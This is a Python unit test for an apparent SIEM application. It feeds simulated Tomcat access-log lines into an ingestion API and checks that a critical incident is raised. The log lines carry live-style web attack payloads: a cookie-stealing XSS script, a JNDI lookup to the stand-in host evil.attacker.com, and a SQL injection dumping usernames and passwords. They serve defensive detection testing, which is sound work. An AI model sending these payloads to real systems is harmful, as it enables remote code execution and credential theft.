import os
import sys
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import psycopg2
import psycopg2.extras
from starlette.requests import Request

os.environ["STRICT_DB_MODE"] = "true"
import database as db
import app_siem_db
from app import (
    api_app_events, api_get_app_events, api_get_app_incidents,
    api_get_app_users, api_get_app_rules, api_approve_app_component
)

class Step3EventsIncidentsTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import time
        import hashlib
        conn = db.get_db_connection()
        cls.conn = conn
        token = "test-token-step3-xyz"
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        with conn.cursor() as cur:
            cur.execute("SELECT id FROM users WHERE role = 'admin' AND is_active = TRUE LIMIT 1;")
            user_row = cur.fetchone()
            cls.user_id = user_row["id"] if user_row else 1

            cur.execute("""
                INSERT INTO applications (name, environment, primary_url, status)
                VALUES (%s, 'Production', 'http://172.31.15.135:8000/testapp', 'WAITING')
                RETURNING id;
            """, (f"Live Incident Test App {int(time.time()*1000)}",))
            cls.app_id = cur.fetchone()["id"]

            cur.execute("""
                INSERT INTO application_components (application_id, role, node_name, node_ip, target_port, enrollment_token, token_hash, status)
                VALUES (%s, 'web', 'test-tomcat-node', '172.31.15.135', '8000', %s, %s, 'WAITING')
                RETURNING id;
            """, (cls.app_id, token, token_hash))
            cls.comp_id = cur.fetchone()["id"]
            conn.commit()

    @classmethod
    def tearDownClass(cls):
        with cls.conn.cursor() as cur:
            cur.execute("DELETE FROM applications WHERE id = %s;", (cls.app_id,))
            cls.conn.commit()
        cls.conn.close()

    def _make_req(self, path="/", headers=None, session=None):
        hdr = [(b"host", b"localhost:8000")]
        if headers:
            for k, v in headers.items():
                hdr.append((k.lower().encode("utf-8"), v.encode("utf-8")))
        scope = {
            "type": "http",
            "method": "POST",
            "path": path,
            "query_string": b"",
            "headers": hdr,
            "session": session or {"user_id": self.user_id, "user": {"username": "admin", "role": "admin"}}
        }
        return Request(scope)

    def test_01_ingest_attacks_and_verify_incidents(self):
        """Simulate real Tomcat access log lines with SQLi, XSS, and JNDI attacks."""
        raw_events = [
            {
                "source": "tomcat_access",
                "file": "/home/apache-tomcat-10.1.61/logs/localhost_access_log.2026-10-28.txt",
                "line": '127.0.0.1 - - [28/Oct/2026:18:15:30 +0000] "GET /testapp/search.jsp?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 652',
                "captured_at": "2026-10-28T18:15:30Z"
            },
            {
                "source": "tomcat_access",
                "file": "/home/apache-tomcat-10.1.61/logs/localhost_access_log.2026-10-28.txt",
                "line": '127.0.0.1 - - [28/Oct/2026:18:16:10 +0000] "GET /testapp/search.jsp?q=${jndi:ldap://evil.attacker.com/exploit} HTTP/1.1" 200 652',
                "captured_at": "2026-10-28T18:16:10Z"
            },
            {
                "source": "tomcat_access",
                "file": "/home/apache-tomcat-10.1.61/logs/localhost_access_log.2026-10-28.txt",
                "line": '127.0.0.1 - - [28/Oct/2026:18:17:00 +0000] "GET /testapp/search.jsp?q=%27%20UNION%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1" 200 652',
                "captured_at": "2026-10-28T18:17:00Z"
            }
        ]

        payload = {
            "app_id": self.app_id,
            "node_name": "test-tomcat-node",
            "role": "web",
            "events": raw_events
        }

        req = self._make_req("/api/app/events", headers={"X-Enrollment-Token": "test-token-step3-xyz"})
        res = api_app_events(req, payload)
        self.assertEqual(res.get("status"), "success")
        self.assertEqual(res.get("ingested"), 3)
        self.assertEqual(res.get("highest_severity"), "critical")

        # Verify incidents in database
        with self.conn.cursor() as cur:
            cur.execute("SELECT * FROM app_incidents WHERE application_id = %s;", (self.app_id,))
            incs = cur.fetchall()
            self.assertGreaterEqual(len(incs), 1)
            inc = incs[0]
            self.assertEqual(inc["severity"], "critical")
            self.assertEqual(inc["status"], "Open")
            self.assertEqual(inc["client_ip"], "127.0.0.1")
            self.assertEqual(inc["events_count"], 3)

            # Check timeline events
            cur.execute("SELECT * FROM app_incident_events WHERE incident_id = %s ORDER BY event_time ASC;", (inc["id"],))
            steps = cur.fetchall()
            self.assertEqual(len(steps), 3)

        print(f"PASS: Ingested 3 attacks, verified incident created with 3 timeline steps!")

    def test_02_api_tabs_data(self):
        """Test that /api/apps/{id}/events, /incidents, /users, /rules all return data."""
        req = self._make_req()
        
        # Events
        events = api_get_app_events(req, self.app_id)
        self.assertEqual(len(events), 3)

        # Incidents
        incs = api_get_app_incidents(req, self.app_id)
        self.assertGreaterEqual(len(incs), 1)
        self.assertEqual(len(incs[0].get("timeline", [])), 3)

        # Users
        users = api_get_app_users(req, self.app_id)
        self.assertGreaterEqual(len(users), 1)
        self.assertEqual(users[0]["client_ip"], "127.0.0.1")
        self.assertEqual(users[0]["attack_events"], 3)

        # Rules
        rules = api_get_app_rules(req, self.app_id)
        self.assertGreater(len(rules), 0)

        # Manual Component Approval
        appr_res = api_approve_app_component(req, self.app_id, self.comp_id)
        self.assertEqual(appr_res.get("status"), "success")

        print(f"PASS: Verified events, incidents, users, rules, and manual component approval!")

if __name__ == "__main__":
    unittest.main()
